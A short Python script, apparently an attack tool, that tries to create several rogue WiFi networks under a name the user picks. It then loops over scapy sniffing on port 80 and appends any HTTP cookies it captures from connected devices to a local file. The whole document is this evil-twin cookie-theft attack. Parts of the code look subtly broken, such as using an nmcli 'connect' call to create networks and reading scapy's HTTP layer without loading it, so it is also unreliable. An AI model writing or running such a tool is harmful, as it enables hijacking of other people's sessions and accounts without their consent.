import os
import subprocess
from scapy.all import *
import time

def create_fake_networks(network_name, num_networks):
    for i in range(num_networks):
        subprocess.run(['nmcli', 'dev', 'wifi', 'rescan'])
        subprocess.run(['nmcli', 'dev', 'wifi', 'list'])
        subprocess.run(['nmcli', 'dev', 'wifi', 'connect', network_name, 'password', ''])
        subprocess.run(['nmcli', 'connection', 'modify', network_name, 'ipv4.method', 'shared'])

def intercept_cookies():
    def packet_handler(packet):
        if packet.haslayer(HTTP):
            cookies = packet[HTTP].Cookie
            with open('intercepted_cookies.txt', 'a') as file:
                file.write(cookies + '\n')

    # Continuously sniff packets and intercept HTTP cookies
    while True:
        sniff(filter='tcp port 80', prn=packet_handler, store=0)
        time.sleep(1)

# Step 1: Show available WiFi networks
subprocess.run(['nmcli', 'dev', 'wifi', 'rescan'])
subprocess.run(['nmcli', 'dev', 'wifi', 'list'])

# Step 2: Prompt the user to choose a network name
network_name = input("Enter the desired network name: ")

# Step 3: Create multiple fake networks with the chosen name
num_networks = int(input("Enter the number of fake networks to create: "))
create_fake_networks(network_name, num_networks)

# Step 4: Continuously intercept HTTP cookies from connected devices
intercept_cookies()
